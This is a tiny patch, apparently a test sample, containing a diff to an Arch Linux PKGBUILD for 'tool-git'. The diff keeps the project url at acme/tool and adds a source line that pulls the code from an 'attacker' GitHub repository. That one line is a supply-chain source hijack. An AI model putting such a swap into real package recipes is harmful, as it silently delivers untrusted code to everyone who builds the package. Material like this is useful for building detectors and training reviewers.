@@ -1,0 +1,8 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,4 +1,5 @@
+ # Maintainer: Alice <alice@example.com>
+ pkgname=tool-git
+ pkgver=1.0
+ url="https://github.com/acme/tool"
++source=('git+https://github.com/attacker/tool.git')
